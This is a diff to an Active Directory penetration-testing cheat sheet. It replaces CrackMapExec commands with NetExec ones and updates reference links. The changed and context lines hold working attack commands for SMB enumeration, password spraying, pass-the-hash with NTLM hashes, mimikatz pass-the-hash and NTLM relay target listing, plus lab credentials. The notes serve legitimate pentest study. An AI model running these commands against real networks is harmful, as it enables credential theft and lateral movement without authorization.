@@ -123,7 +123,7 @@ Let's assume that at this point you have credentials or a foothold within a comp
 
 Get-NetDomain
 
-CrackMapExec: cme smb 192.168.1.0/24
+NetExec: nxc smb 192.168.1.0/24
 Enumerates SMB hosts in a subnet to identify live systems for targeting.
 
 
@@ -148,7 +148,7 @@ Performs DCSync to extract krbtgt hash for Golden Ticket creation.
 
 
 
-CrackMapExec: cme smb <TARGET_IP> -u <USER> -H <HASH>
+NetExec: nxc smb <TARGET_IP> -u <USER> -H <HASH>
 Uses NTLM hash for Pass-the-Hash to move laterally to target systems.
 
 
@@ -264,7 +264,7 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 
 * Helpful **Tools**:
 
-* crackmapexec
+* NetExec
 * `enum4linux -a target_ip > enum.log`
 
 * AD recon: https://github.com/sense-of-security/ADRecon
@@ -272,11 +272,11 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 * targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
 
 
-### Crackmapexec
+### NetExec
 
 find machines in range where current user is admin
 
-`cme smb 192.168.239.0/24 -u pete -p "Nexus123\!" --continue-on-success`
+`nxc smb 192.168.239.0/24 -u pete -p "Nexus123\!" --continue-on-success`
 
 ### Kerbrute
 
@@ -286,7 +286,7 @@ find users of domain via TGT requests
 
 ### PowerView
 
-Reference: https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
+Reference: https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/powerview.html
 
 
 * Poverview has a lot of built-in AD functionalities
@@ -433,7 +433,7 @@ Try attacking AD in this order:
 
 * SMB
 
-`cme smb bamdc1.skorp.com -u users_enum.txt -p Password1 --continue-on-success | grep '+'`
+`nxc smb bamdc1.skorp.com -u users_enum.txt -p Password1 --continue-on-success | grep '+'`
 
 * TGT
 
@@ -564,11 +564,11 @@ sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233
 
 ```
 
-* bruteforce with crackmapexec
+* bruteforce with NetExec
 
 ```bash
 
-crackmapexec smb ip -u users.txt -H 2126EE7712D37E265FD63F2C84D2B13D --local-auth
+nxc smb ip -u users.txt -H 2126EE7712D37E265FD63F2C84D2B13D --local-auth
 
 ```
 
@@ -1063,9 +1063,9 @@ NTLMv2 can be captured by Responder using various poisoning techniques. BUT IT C
 
 NSo to exploit it you need to setup a relay and perform all actions through it:
 
-1. crackmapexec genrelay: list hosts without SMB signing
+1. NetExec genrelay: list hosts without SMB signing
 
-`cme smb <197.1.1.0/24> --gen-relay-list './hosts/targets_smb_no_sign.txt'`
+`nxc smb <197.1.1.0/24> --gen-relay-list './hosts/targets_smb_no_sign.txt'`
 
 2. configure proxychains
 
@@ -1105,6 +1105,6 @@ or smbexec if ADMIN is given
 ## Additional Reading
 * Good Theory around AD: [zer1t0](https://zer1t0.gitlab.io/posts/attacking_ad/)
 * Attack Methods Summary: [m0chan](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
-* HackTricks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+* HackTricks: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
 * Relay Attacks: https://w4h33d.gitbook.io/hack-notes/active-directory-ad/active-directory-attacks/ipv6-attacks/ipv6-attack-in-action
 * Another very nice cheatsheet which goes beyond OSCP can be found here too: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
